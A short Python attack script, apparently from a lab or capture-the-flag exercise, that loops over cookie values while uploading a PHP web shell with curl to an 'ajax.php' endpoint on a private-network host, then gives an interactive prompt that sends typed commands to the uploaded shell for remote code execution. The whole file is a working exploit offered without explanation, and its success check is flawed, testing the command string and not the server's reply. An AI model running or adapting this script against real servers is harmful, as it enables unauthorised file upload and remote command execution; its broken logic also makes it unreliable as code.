import os
import requests
import string
wordlist = string.ascii_uppercase
print(wordlist)
for x in wordlist:
    x = x + "'"
    command = "curl -k -F 'file=@./shell.php' -F 'secure=val1d' --cookie 'admin=&G6u@B6uDXMq&Ms"+x + " " + "http://10.0.2.251/ajax.php"
    os.system(command)
if "1" in command:
    print("[+] Shell Uploaded!")
    print('\033[2;36;40m "[+] Shell Uploaded!" \033[0;0m')
    for execute in command:
        execute_command = input ("[!] Command to Execute: ")
        get_rce = requests.get("http://10.0.2.251/owls/shell.php?cmd="+execute_command)
        print(str(get_rce.content))
        if execute_command == "clear":
            os.system("clear")
else:
    print("[!] Shell not Uploaded!")